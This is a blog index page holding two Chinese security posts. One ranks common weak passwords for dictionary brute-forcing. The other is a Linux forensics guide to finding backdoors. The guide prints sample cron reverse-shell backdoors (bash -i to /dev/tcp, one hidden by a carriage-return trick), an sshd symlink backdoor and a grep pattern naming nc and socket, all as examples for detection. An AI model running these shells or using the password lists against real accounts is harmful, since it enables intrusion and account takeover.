<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.3/css/all.min.css" integrity="sha256-2H3fkXt6FEmrReK448mDVGKb3WW2ZZw35gI7vqHOE4Y=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Muse","version":"8.5.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
<meta name="description" content="Always good to see">
<meta property="og:type" content="website">
<meta property="og:title" content="aplyc1a&#39;s blogs">
<meta property="og:url" content="http://example.com/page/2/index.html">
<meta property="og:site_name" content="aplyc1a&#39;s blogs">
<meta property="og:description" content="Always good to see">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="aplyc1a">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="http://example.com/page/2/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"en","comments":"","permalink":"","path":"page/2/index.html","title":""}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>aplyc1a's blogs</title>
  




  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">aplyc1a's blogs</h1>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>







</div>
        
  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-overview-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-overview">
            <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">aplyc1a</p>
  <div class="site-description" itemprop="description">Always good to see</div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives">
          <span class="site-state-item-count">24</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">3</span>
        <span class="site-state-item-name">tags</span>
      </div>
  </nav>
</div>



          </div>
        </div>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="back-to-top" role="button" aria-label="Back to top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner index posts-expand">

    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/06/22/%E5%9B%BD%E5%86%85%E5%B8%B8%E8%A7%81%E7%9A%84%E5%AF%86%E7%A0%81%E7%BC%96%E6%8E%92%E6%A8%A1%E5%BC%8F/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="aplyc1a">
      <meta itemprop="description" content="Always good to see">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="aplyc1a's blogs">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/06/22/%E5%9B%BD%E5%86%85%E5%B8%B8%E8%A7%81%E7%9A%84%E5%AF%86%E7%A0%81%E7%BC%96%E6%8E%92%E6%A8%A1%E5%BC%8F/" class="post-title-link" itemprop="url">国内常见的密码编排模式</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2021-06-22 10:16:09" itemprop="dateCreated datePublished" datetime="2021-06-22T10:16:09-08:00">2021-06-22</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">Edited on</span>
        <time title="Modified: 2021-06-21 19:22:55" itemprop="dateModified" datetime="2021-06-21T19:22:55-08:00">2021-06-21</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="密码编排模式分析"><a href="#密码编排模式分析" class="headerlink" title="密码编排模式分析"></a>密码编排模式分析</h2><p>口令爆破效果的好坏与字典的质量系系相关，为了在实战中取得高效的成果，故而花了一段时间分析口令，故成此文。</p>
<p>口令用来鉴权，安全性要求我们要将口令设置的足够复杂且不混用，使得在枚举爆破时攻击者花费的时间代价是不可承受的，然而，现实与理想条件下是截然不同的，围绕人这一因素，弱口令的出现无法避免。</p>
<p>同时，在实际口令爆破登录中，可以发现针对不同角色的口令爆破，惯用密码的类型也有差异。但是不管怎样，为了方便人记住，大多数密码都是现实生活中某些特点在虚拟世界中的投影。</p>
<h3 id="0x00-普通账户口令"><a href="#0x00-普通账户口令" class="headerlink" title="0x00 普通账户口令"></a>0x00 普通账户口令</h3><p>这里以网上公开途径获得到的国内的口令数据源为例，统计后，可以发现常见弱口令的构成无外乎以下几方面：</p>
<p>1.元素在键盘上的空间位置。</p>
<p>2.家人的生日、手机号、姓名。</p>
<p>3.情绪词汇。</p>
<p>4.一些吉利或上口的数字。</p>
<h4 id="1-用户口令分析"><a href="#1-用户口令分析" class="headerlink" title="1 用户口令分析"></a>1 用户口令分析</h4><p>翻阅数据源可以看到，绝大部分的口令都存在一定的安全问题，在下面给出的一些常见构型中，越是使用大众化常见的词汇，越是容易在字典匹配，越是使用个人信息相关的也越容易被通过社工字典方式得到匹配。总之，这些构型都存在安全问题：</p>
<h5 id="1-1-姓名-连接符（可选）-数字"><a href="#1-1-姓名-连接符（可选）-数字" class="headerlink" title="1.1 姓名+连接符（可选）+数字"></a>1.1 姓名+连接符（可选）+数字</h5><p>各种姓名的变形+数字（生日、手机号、吉利数字、顺口溜数字）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">liming</span><br><span class="line">limingliming</span><br><span class="line">liming20210814</span><br><span class="line">liming0814</span><br><span class="line">lm20210814</span><br><span class="line">lm0814~~</span><br><span class="line">lm18801239876</span><br><span class="line">liming9876</span><br><span class="line">liming@2333</span><br><span class="line">liming2333</span><br><span class="line">liming666</span><br><span class="line">lm666888</span><br></pre></td></tr></table></figure>

<h5 id="1-2-姓名-连接符（可选）-字符"><a href="#1-2-姓名-连接符（可选）-字符" class="headerlink" title="1.2 姓名+连接符（可选）+字符"></a>1.2 姓名+连接符（可选）+字符</h5><p>主要是各种姓名的变形+字符（键盘上相邻字符、短语、单词）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">limingqwe123</span><br><span class="line">liming123</span><br></pre></td></tr></table></figure>

<h5 id="1-3-个人属性"><a href="#1-3-个人属性" class="headerlink" title="1.3 个人属性"></a>1.3 个人属性</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">18801239876</span><br><span class="line">20210814</span><br><span class="line">woaini1314</span><br></pre></td></tr></table></figure>

<h5 id="1-4-键盘空间排布"><a href="#1-4-键盘空间排布" class="headerlink" title="1.4 键盘空间排布"></a>1.4 键盘空间排布</h5><p>密码与键盘排布系系相关，主要分为电脑键盘与手机输入法9键两种</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">123456</span><br><span class="line">qq123456</span><br><span class="line">111111</span><br><span class="line">1q2w3e4r</span><br><span class="line">qwe123</span><br><span class="line">zxc123456</span><br><span class="line">88888888</span><br><span class="line">1598753</span><br><span class="line">741258</span><br><span class="line">a123456789</span><br></pre></td></tr></table></figure>

<h5 id="1-5-短语"><a href="#1-5-短语" class="headerlink" title="1.5 短语"></a>1.5 短语</h5><p>不少都是非常情绪化的词汇，爱情、脏话、追星等等。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">laopo520</span><br><span class="line">love5201314</span><br><span class="line">loveyou1314</span><br><span class="line">wodemima</span><br><span class="line">bianhao89757</span><br></pre></td></tr></table></figure>

<h4 id="2-弱口令统计规律"><a href="#2-弱口令统计规律" class="headerlink" title="2 弱口令统计规律"></a>2 弱口令统计规律</h4><p>下面以某公开途径获得的弱口令统计计数为例，前200的弱口令如下。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br></pre></td><td class="code"><pre><span class="line">224979 123456</span><br><span class="line"> 62064 123456789</span><br><span class="line"> 58345 111111</span><br><span class="line"> 36464 123123</span><br><span class="line"> 29223 000000</span><br><span class="line"> 22532 5201314</span><br><span class="line"> 16103 aaaaaa</span><br><span class="line"> 15617 a123456</span><br><span class="line"> 10602 123321</span><br><span class="line">  8229 1314520</span><br><span class="line">  8217 7758521</span><br><span class="line">  7122 123456a</span><br><span class="line">  7076 12345678</span><br><span class="line">  6793 1234567890</span><br><span class="line">  6663 wangyut2</span><br><span class="line">  6377 123123123</span><br><span class="line">  6208 woaini</span><br><span class="line">  5798 1234567</span><br><span class="line">  5694 123</span><br><span class="line">  4761 112233</span><br><span class="line">  4729 11111111</span><br><span class="line">  4673 9958123</span><br><span class="line">  4468 zxcvbnm</span><br><span class="line">  4459 qq123456</span><br><span class="line">  4421 666666</span><br><span class="line">  4355 5211314</span><br><span class="line">  4340 7758258</span><br><span class="line">  4158 123654</span><br><span class="line">  4136 hm9958123</span><br><span class="line">  3979 a123456789</span><br><span class="line">  3947 asdasd</span><br><span class="line">  3825 147258369</span><br><span class="line">  3754 520520</span><br><span class="line">  3688 110110</span><br><span class="line">  3661 woaini1314</span><br><span class="line">  3605 100200</span><br><span class="line">  3273 1111111</span><br><span class="line">  2880 asd123</span><br><span class="line">  2813 147258</span><br><span class="line">  2802 a123123</span><br><span class="line">  2770 123456789a</span><br><span class="line">  2715 q123456</span><br><span class="line">  2713 159357</span><br><span class="line">  2653 159753</span><br><span class="line">  2594 00000000</span><br><span class="line">  2531 888888</span><br><span class="line">  2480 654321</span><br><span class="line">  2475 121212</span><br><span class="line">  2422 qwe123</span><br><span class="line">  2386 qwertyuiop</span><br><span class="line">  2375 asdfghjkl</span><br><span class="line">  2333 123qwe</span><br><span class="line">  2291 1314521</span><br><span class="line">  2232 789456123</span><br><span class="line">  2222 88888888</span><br><span class="line">  2209 123000</span><br><span class="line">  2191 liuchang</span><br><span class="line">  2088 321321</span><br><span class="line">  2070 qazwsx</span><br><span class="line">  2012 asd123456</span><br><span class="line">  1997 qqqqqq</span><br><span class="line">  1947 aa123456</span><br><span class="line">  1940 z123456</span><br><span class="line">  1913 987654321</span><br><span class="line">  1778 456852</span><br><span class="line">  1766 521521</span><br><span class="line">  1765 woaini123</span><br><span class="line">  1717 woaini520</span><br><span class="line">  1679 741852963</span><br><span class="line">  1654 xx123456</span><br><span class="line">  1625 qweqwe</span><br><span class="line">  1622 qwerty</span><br><span class="line">  1618 abc123</span><br><span class="line">  1610 222222</span><br><span class="line">  1596 1qaz2wsx</span><br><span class="line">  1571 qweasdzxc</span><br><span class="line">  1571 31415926</span><br><span class="line">  1567 123456aa</span><br><span class="line">  1555 zxc123</span><br><span class="line">  1544 110120</span><br><span class="line">  1539 1q2w3e4r</span><br><span class="line">  1535 qazwsxedc</span><br><span class="line">  1535 111222</span><br><span class="line">  1523 123456qq</span><br><span class="line">  1502 555555</span><br><span class="line">  1446 qwe123456</span><br><span class="line">  1418 999999</span><br><span class="line">  1416 456123</span><br><span class="line">  1408 iloveyou</span><br><span class="line">  1401 woaini521</span><br><span class="line">  1382 a5201314</span><br><span class="line">  1378 12301230</span><br><span class="line">  1373 abc123456</span><br><span class="line">  1362 w123456</span><br><span class="line">  1359 789456</span><br><span class="line">  1357 1111111111</span><br><span class="line">  1357 0000000</span><br><span class="line">  1347 caonima</span><br><span class="line">  1336 a111111</span><br><span class="line">  1326 zxcvbnm123</span><br><span class="line">  1321 1234560</span><br><span class="line">  1312 123654789</span><br><span class="line">  1310 123456q</span><br><span class="line">  1310 1</span><br><span class="line">  1306 102030</span><br><span class="line">  1303 1230123</span><br><span class="line">  1282 asdfgh</span><br><span class="line">  1279 753951</span><br><span class="line">  1257 asdasdasd</span><br><span class="line">  1226 123698745</span><br><span class="line">  1204 201314</span><br><span class="line">  1199 7758520</span><br><span class="line">  1196 333333</span><br><span class="line">  1189 zhang123</span><br><span class="line">  1181 12345</span><br><span class="line">  1181 1234</span><br><span class="line">  1179 0123456789</span><br><span class="line">  1175 584520</span><br><span class="line">  1130 123123a</span><br><span class="line">  1122 aini1314</span><br><span class="line">  1108 123456abc</span><br><span class="line">  1094 25257758</span><br><span class="line">  1064 a000000</span><br><span class="line">  1044 qweasd</span><br><span class="line">  1020 134679</span><br><span class="line">  1004 111111111</span><br><span class="line">  1003 741852</span><br><span class="line">  1000 95368452</span><br><span class="line">   999 147852369</span><br><span class="line">   996 wocaonima</span><br><span class="line">   994 qaz123</span><br><span class="line">   992 5845201314</span><br><span class="line">   987 963852741</span><br><span class="line">   985 1q2w3e</span><br><span class="line">   982 7777777</span><br><span class="line">   975 1111</span><br><span class="line">   952 147852</span><br><span class="line">   951 101010</span><br><span class="line">   942 woainima</span><br><span class="line">   936 0000000000</span><br><span class="line">   917 q123456789</span><br><span class="line">   916 zxc123456</span><br><span class="line">   916 as123456</span><br><span class="line">   909 zzzzzz</span><br><span class="line">   905 456456</span><br><span class="line">   899 qq123123</span><br><span class="line">   882 456789</span><br><span class="line">   879 1233211234567</span><br><span class="line">   871 123456asd</span><br><span class="line">   856 123789</span><br><span class="line">   850 xuliang</span><br><span class="line">   839 3344520</span><br><span class="line">   821 woaiwojia</span><br><span class="line">   816 qq5201314</span><br><span class="line">   810 111111a</span><br><span class="line">   805 123456123</span><br><span class="line">   802 1q2w3e4r5t</span><br><span class="line">   795 963852</span><br><span class="line">   793 7895123</span><br><span class="line">   787 951753</span><br><span class="line">   786 5201314a</span><br><span class="line">   777 0123456</span><br><span class="line">   775 778899</span><br><span class="line">   775 211314</span><br><span class="line">   773 buzhidao</span><br><span class="line">   763 a123456a</span><br><span class="line">   761 abcd1234</span><br><span class="line">   761 321654</span><br><span class="line">   760 asdfasdf</span><br><span class="line">   757 zxczxc</span><br><span class="line">   745 wang123</span><br><span class="line">   739 xiaoxiao</span><br><span class="line">   738 yangyang</span><br><span class="line">   732 5845211314</span><br><span class="line">   731 010203</span><br><span class="line">   726 windows</span><br><span class="line">   724 11223344</span><br><span class="line">   720 password</span><br><span class="line">   719 020332007051</span><br><span class="line">   711 789789</span><br><span class="line">   706 mm123123</span><br><span class="line">   706 a1314520</span><br><span class="line">   703 11111</span><br><span class="line">   702 131421</span><br><span class="line">   702 1234qwer</span><br><span class="line">   702 123456789q</span><br><span class="line">   695 123abc</span><br><span class="line">   692 12345678910</span><br><span class="line">   683 aa123123</span><br><span class="line">   680 a12345</span><br><span class="line">   676 q1w2e3r4</span><br><span class="line">   664 110120119</span><br><span class="line">   653 5201314520</span><br><span class="line">   649 qaz123456</span><br><span class="line">   648 123qweasd</span><br><span class="line">   648 0000</span><br><span class="line">   640 584521</span><br><span class="line">   640 123321123</span><br><span class="line">   640 111222333</span><br><span class="line">   637 123456987</span><br></pre></td></tr></table></figure>

<h4 id="3-口令爆破之思"><a href="#3-口令爆破之思" class="headerlink" title="3 口令爆破之思"></a>3 口令爆破之思</h4><p>两种思路：</p>
<h5 id="3-1-目标是自然人"><a href="#3-1-目标是自然人" class="headerlink" title="3.1.目标是自然人"></a>3.1.目标是自然人</h5><p>先撞普通用户的通用弱口令，再过社工字典。</p>
<p>社工字典的生成：<a target="_blank" rel="noopener" href="http://github.com/aplyc1a/RainCode">http://github.com/aplyc1a/RainCode</a></p>
<h5 id="3-2-目标是网站"><a href="#3-2-目标是网站" class="headerlink" title="3.2.目标是网站"></a>3.2.目标是网站</h5><p>每个用户撞一遍普通用户的通用弱口令。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/06/22/Linux%E5%85%A5%E4%BE%B5%E7%97%95%E8%BF%B9%E5%8F%96%E8%AF%81(8)-%E6%9F%A5%E6%89%BE%E5%90%8E%E9%97%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="aplyc1a">
      <meta itemprop="description" content="Always good to see">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="aplyc1a's blogs">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/06/22/Linux%E5%85%A5%E4%BE%B5%E7%97%95%E8%BF%B9%E5%8F%96%E8%AF%81(8)-%E6%9F%A5%E6%89%BE%E5%90%8E%E9%97%A8/" class="post-title-link" itemprop="url">Linux入侵事件取证(8)-查找后门</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2021-06-22 10:16:09" itemprop="dateCreated datePublished" datetime="2021-06-22T10:16:09-08:00">2021-06-22</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">Edited on</span>
        <time title="Modified: 2021-06-21 19:26:27" itemprop="dateModified" datetime="2021-06-21T19:26:27-08:00">2021-06-21</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="后门识别"><a href="#后门识别" class="headerlink" title="后门识别"></a>后门识别</h1><p>后门程序一般是指那些绕过安全性控制而获取对程序或系统访问权的程序方法，是一个很泛的说法。依据用途我大概将它分为4类：</p>
<ul>
<li>1、登录后门。用于帮助攻击者便捷的登录失陷主机。</li>
<li>2、间谍后门。用于偷取用户的敏感数据。</li>
<li>3、提权后门。用于帮助攻击者从低权限账户跳跃到高权限账户。</li>
<li>4、rootkit。用于帮助攻击者在失陷主机上实现顽固并隐身的驻留。</li>
</ul>
<p>登录后门最为常见。后门想要实现持久化基本都会将自身写入以下位置：计划任务、系统启动项、Shell配置文件、公共库文件、高频使用的命令。因此虽然后门种类有区别，但是驻留思路都是相近相通的。这类后门有些是由攻击者攻破系统后放置的，有些也可能时管理员配置疏忽导致。</p>
<h2 id="1-非提权类型后门排查"><a href="#1-非提权类型后门排查" class="headerlink" title="1 非提权类型后门排查"></a>1 非提权类型后门排查</h2><h3 id="1-1-后门账户"><a href="#1-1-后门账户" class="headerlink" title="1.1 后门账户"></a>1.1 后门账户</h3><p>攻击者拥有账户权限后，想达到长期驻留系统时往往不修改账户密码，而是采取加用户或写公钥的方式。</p>
<p>排查过程中主要关注： </p>
<p>(1)    检查免口令认证公钥。</p>
<p>有公钥输出就要确认该公钥是否属于运维人员自己的公钥。该公钥是否被用于登录。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for i in `cat /etc/passwd|grep &quot;/bash&quot;|awk -F: &#x27;&#123;print $6&#125;&#x27;`;do cat $&#123;i&#125;/.ssh/authorized_keys ;done</span><br></pre></td></tr></table></figure>

<p>找到未知公钥后可以参考下面的方法，计算出公钥的指纹信息，再在日志里面搜索，进而确定该公钥是否已被用于登录。如果搜索出来的信息关联到了一个IP，自行确认IP信息后，可以确定系统内插了个后门账户。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -rn `sed -n &#x27;$&#123;line_num&#125;p&#x27; ~$&#123;user&#125;/.ssh/authorized_keys |ssh-keygen -lf -|awk &#x27;&#123;print $2&#125;&#x27;` /var/log</span><br></pre></td></tr></table></figure>

<p>(2)    检查系统账户配置文件。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd | awk -F: &#x27;&#123;print $3&quot;  &quot;$1&#125;&#x27;|sort -n </span><br><span class="line"><span class="meta">#</span><span class="bash">存在多个相同的uid说明有隐藏账户。</span></span><br></pre></td></tr></table></figure>

<p>自行观察账户文件底部的是否有新增用户，名称，家目录是否具有迷惑性。</p>
<h3 id="1-2-篡改计划任务"><a href="#1-2-篡改计划任务" class="headerlink" title="1.2 篡改计划任务"></a>1.2 篡改计划任务</h3><p>分析定时任务文件中是否存在定时创建socket,定时外发文件的动作。简单的排查命令如下：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">grep -rn &quot;/dev/\| nc\|sh\|telnet\|*cat\|awk\|system\|eval\|socket\|exec&quot; /var/spool/*cron/</span><br><span class="line">grep -rn &quot;/dev/\| nc\|sh\|telnet\|*cat\|awk\|system\|eval\|socket\|exec&quot; /etc/*cron*</span><br></pre></td></tr></table></figure>

<p>几个常见的定时任务后门的形式：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">crontab -l | &#123; cat; echo &quot;*/1 * * * * bash -i &gt;&amp; /dev/tcp/192.168.44.128/2333 0&gt;&amp;1&quot;; &#125; | crontab -</span><br><span class="line">(crontab -l;printf &quot;*/1 * * * * bash -i &gt;&amp; /dev/tcp/192.168.44.128/5555 0&gt;&amp;1;\rno crontab for `whoami`%100c\n&quot;)|crontab -</span><br><span class="line">echo &#x27; * */5 * * * root ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=31337&#x27; &gt;&gt; /etc/crontab</span><br></pre></td></tr></table></figure>

<h3 id="1-3-服务型后门"><a href="#1-3-服务型后门" class="headerlink" title="1.3 服务型后门"></a>1.3 服务型后门</h3><h4 id="1-3-1-systemd后门"><a href="#1-3-1-systemd后门" class="headerlink" title="1.3.1 systemd后门"></a>1.3.1 systemd后门</h4><p>参考 0x06 自启动任务排查，关注以下目录中是否存在后门指令。</p>
